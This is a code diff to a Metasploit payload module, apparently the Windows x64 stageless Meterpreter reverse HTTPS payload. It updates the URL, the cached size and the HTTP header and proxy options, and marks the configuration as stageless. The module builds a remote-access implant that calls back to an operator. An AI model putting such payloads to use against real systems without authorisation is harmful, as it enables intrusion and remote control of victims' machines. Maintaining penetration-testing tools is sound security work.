@@ -1,9 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/payload/transport_config'
 require 'msf/core/handler/reverse_https'
 require 'msf/core/payload/windows/x64/meterpreter_loader'
@@ -13,7 +12,7 @@ require 'rex/payloads/meterpreter/config'
 
 module MetasploitModule
 
-  CachedSize = 1190467
+  CachedSize = 202329
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
@@ -37,7 +36,12 @@ module MetasploitModule
     register_options([
       OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),
       OptString.new('EXTINIT',    [false, 'Initialization strings for extensions'])
-    ], self.class)
+    ])
+
+    register_advanced_options(
+      Msf::Opt::http_header_options +
+      Msf::Opt::http_proxy_options
+    )
   end
 
   def generate(opts={})
@@ -56,7 +60,8 @@ module MetasploitModule
       uuid:       opts[:uuid],
       transports: [transport_config_reverse_https(opts)],
       extensions: (datastore['EXTENSIONS'] || '').split(','),
-      ext_init:   (datastore['EXTINIT'] || '')
+      ext_init:   (datastore['EXTINIT'] || ''),
+      stageless:  true
     }
 
     # create the configuration instance based off the parameters
@@ -65,5 +70,4 @@ module MetasploitModule
     # return the binary version of it
     config.to_b
   end
-
 end
